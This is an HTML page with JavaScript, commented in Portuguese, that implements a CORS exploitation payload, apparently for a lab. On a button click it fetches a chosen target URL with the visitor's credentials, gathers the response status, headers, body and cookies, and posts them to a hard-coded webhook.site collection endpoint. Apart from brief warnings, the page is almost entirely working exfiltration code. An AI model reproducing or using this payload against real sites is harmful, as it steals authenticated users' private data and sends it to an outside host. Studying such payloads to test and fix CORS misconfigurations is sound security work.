<!--
  Payload CORS Automatizado para laboratório
  NÃO USAR EM PRODUÇÃO OU EM ALVOS NÃO AUTORIZADOS • Uso ético e instrucional
  
  Ao clicar, faz fetch cross-origin, coleta resposta (status, cabeçalhos, corpo, cookies*), envia via POST para endpoint de coleta.
  *document.cookie só será enviado se o payload estiver rodando no MESMO domínio do alvo (restrição do JS).
-->

<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Demo Payload CORS Laboratório</title>
  <style>
    body { font-family: sans-serif; margin: 40px; }
    textarea { width: 90%; height: 180px; }
    .alert { color: #d00; font-weight: bold; }
    #log { background: #eaeaea; padding: 12px; border-radius: 6px; margin-top: 15px; }
  </style>
</head>
<body>

  <h2>⚠️ Demonstração Payload CORS (Uso Educativo!)</h2>
  <p class="alert">
    Este exemplo é para <b>laboratório controlado</b>! <br>
    NÃO execute em sistemas terceiros sem permissão.
  </p>

  <label>Endpoint alvo (CORS):</label>
  <input id="targetUrl" style="width:70%;" type="text"
    value="https://exemplo.alvo.com/endpoint"
  />
  <br><br>
  <button onclick="executarPayload()">Executar Payload de CORS</button>
  <br>

  <div id="log">
    <b>Status:</b> <span id="statusTxt">Aguardando ação...</span>
    <br>
    <b>Resposta raw:</b>
    <textarea id="output" readonly>(nenhuma ainda)</textarea>
  </div>

<script>
const endpointWebhook = "https://webhook.site/927f4c84-caef-4b6e-ba91-517fdb8673c3";

async function executarPayload() {
  document.getElementById('statusTxt').textContent = "Executando payload...";

  const url = document.getElementById('targetUrl').value;
  if (!url.startsWith("http")) {
    document.getElementById('statusTxt').textContent = "Informe um endpoint válido!";
    return;
  }

  let resultado = {
    alvo: url,
    momento: new Date().toISOString(),
    resultadoFetch: null,
    infos: [],
    cookie: "(não acessível via JS / cross-origin)"
  };

  try {
    // 1. Executar o fetch cross-origin com credenciais
    const resp = await fetch(url, {
      credentials: "include", // importante para enviar cookies do usuário
      method: "GET" // ou "POST" se quiser testar outro método
    });

    // 2. Capturar status, headers, body da resposta
    const headers = {};
    for (const [k, v] of resp.headers.entries()) headers[k] = v;

    let body = "";
    try {
      // Tentar capturar o corpo como string
      body = await resp.text();
    } catch (e) {
      body = "[Falha ao ler body]";
    }

    resultado.resultadoFetch = {
      status: resp.status,
      statusText: resp.statusText,
      headers,
      body
    };

    resultado.infos.push("Fetch concluído, status HTTP: " + resp.status);

    // 3. Tentar capturar cookies via JS (Só funciona MESMO domínio do alvo)
    try {
      resultado.cookie = document.cookie || "(vazio)";
    } catch (e) {
      resultado.cookie = "(restrito pelo navegador)";
    }

  } catch (e) {
    resultado.infos.push("Erro no fetch: " + e);
  }

  // 4. Exibir no navegador
  document.getElementById('statusTxt').textContent =
    resultado.infos.join(" | ");

  document.getElementById('output').value =
    JSON.stringify(resultado, null, 2);

  // 5. Enviar para seu endpoint de coleta (webhook.site já aberto para você!)
  try {
    await fetch(endpointWebhook, {
      method: "POST",
      body: JSON.stringify(resultado),
      headers: {"Content-Type": "application/json"},
      mode: "no-cors" // para garantir que não bloqueie envio
    });
    resultado.infos.push("Resultado enviado para webhook/site.");
  } catch (e) {
    resultado.infos.push("Falha ao enviar para webhook: " + e);
  }
}
</script>

</body>
</html>
